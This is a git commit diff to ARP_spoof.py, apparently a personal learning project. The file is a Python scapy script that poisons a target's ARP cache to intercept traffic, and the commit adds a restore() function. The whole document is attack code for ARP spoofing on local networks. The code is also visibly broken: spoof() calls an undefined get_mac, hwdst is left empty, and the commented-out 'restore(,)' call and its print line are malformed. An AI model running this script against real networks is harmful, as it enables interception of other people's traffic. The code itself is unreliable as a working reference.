e462485cdc5ebf93bf6430f358383c05366c359c
El-Gendi <bodyelgendi3993@gmail.com>
2025-01-20 16:50:28 -0500

    testing restore function...

--- ARP_spoof.py
+++ ARP_spoof.py
@@ -3,22 +3,23 @@
 import scapy.all as scapy
 import time
 
-def mac_scanner(ip):
+def mac_scan(ip):
         arp_request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         arp_request_broadcast = broadcast/arp_request
         answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
         return answered_list[0][1].hwsrc
-#	clients_list = []
-#        for element in answered_list:
-#                client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
-#                clients_list.append(client_dict)
-#        return (clients_list)
 
 def spoof(target_ip, spoof_ip):
 	target_mac = get_mac(target_ip)
 	packet = scapy.ARP(op=2, pdst=target_ip, hwdst="", psrc=spoof_ip)
 	scapy.send(packet, verbose=False)
+
+def restore(dest_ip, src_ip):
+	dest_mac = mac_scan(dest_ip)
+	src_mac = mac_scan(src_ip)
+	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+	scapy.send(packet, count=4, verbose=False)
 
 sent_packets_count = 0
 try:
@@ -30,3 +31,5 @@ try:
 		time.sleep(2)
 except KeyboardInterrupt:
 	print("\n[+] Exiting program...")
+#	restore(,)
+#	print("\n[+] Resetting ARP Tables..."
